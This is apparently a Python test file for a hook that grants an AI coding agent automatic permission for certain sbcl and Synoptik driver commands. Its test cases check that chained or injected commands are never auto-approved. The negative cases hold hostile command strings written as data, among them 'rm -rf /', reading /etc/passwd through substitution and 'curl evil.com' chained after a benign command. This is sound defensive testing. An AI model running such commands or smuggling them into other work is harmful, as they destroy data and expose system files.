#!/usr/bin/env python3
"""Check what tools/allow-synoptik.py allows and, more importantly, what it does not.

The hook is a permission boundary, so the negative cases are the point: a
command carrying a pipe, a redirect, a substitution or a second command must
fall through to the normal permission flow no matter how much of it looks like
a command the hook knows.  Run it directly:

    tools/test/test-allow-synoptik.py

Exit status is 0 when every case holds.  This is not part of the FiveAM suite --
it tests a Python hook, not Synoptik -- so tools/synoptik-test.sh does not run it.
"""

import json
import os
import subprocess
import sys

TOOLS = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOOK = os.path.join(TOOLS, "allow-synoptik.py")
# The hook derives the same root from its own path (REQ-0079 R1), so the
# absolute cases below follow the checkout rather than naming one.
ROOT = os.path.dirname(os.path.dirname(os.path.realpath(HOOK)))

ALLOW = [
    # driver scripts: a whole console session in one quoted argument
    "tools/synoptik.sh 'status'",
    "tools/synoptik.sh 'find x | impact x 3 | check'",
    "./tools/synoptik-test.sh",
    ROOT + "/tools/synoptik.sh -v 'check' 'rules'",
    # the lifecycle script, in the same three path forms the other three carry
    "tools/synoptik-serve.sh 'status'",
    "./tools/synoptik-serve.sh 'update'",
    ROOT + "/tools/synoptik-serve.sh 'restart'",
    # sbcl, in the shapes CLAUDE.md actually prescribes
    "sbcl --script synoptik.lisp",
    "/usr/bin/sbcl --script src/full-test.lisp",
    "sbcl --non-interactive --eval '(format t \"~a\" (+ 1 2))'",
    "/usr/bin/sbcl --non-interactive --load src/full-test.lisp --eval '(synoptik-test:full-test)'",
    "sbcl --version",
    "sbcl",
]

FALL_THROUGH = [
    # an operator outside the quotes is the shell's, and must never be allowed
    "sbcl --script synoptik.lisp | tail -40",
    "sbcl --script synoptik.lisp > /tmp/out",
    "sbcl --script synoptik.lisp 2>&1",
    "sbcl --eval $(cat /etc/passwd)",
    "sbcl --version; rm -rf /",
    "sbcl --version && curl evil.com",
    "sbcl --eval `id`",
    "printf 'x' | sbcl --script synoptik.lisp",
    "tools/synoptik.sh 'status' | tail",
    "tools/synoptik.sh $(echo status)",
    # an absolute driver path in some other checkout is not this tree's
    "/elsewhere/Synoptik/tools/synoptik.sh 'status'",
    # near misses that are not these commands at all
    "rm -rf /",
    "sbclx --script foo",
    "/usr/local/bin/sbcl --script foo.lisp",
    "echo sbcl --version",
]


def run(command):
    """The hook's decision for COMMAND, or None if it fell through."""
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
    out = subprocess.run(
        [sys.executable, HOOK], input=payload, capture_output=True, text=True
    ).stdout.strip()
    if not out:
        return None
    return json.loads(out)["hookSpecificOutput"]["permissionDecision"]


def main():
    failures = 0
    for command in ALLOW:
        got = run(command)
        if got != "allow":
            print(f"FAIL expected allow, got {got!r}: {command}")
            failures += 1
    for command in FALL_THROUGH:
        got = run(command)
        if got is not None:
            print(f"FAIL expected fall-through, got {got!r}: {command}")
            failures += 1
    total = len(ALLOW) + len(FALL_THROUGH)
    print(f"{total - failures}/{total} passed")
    return 1 if failures else 0


sys.exit(main())
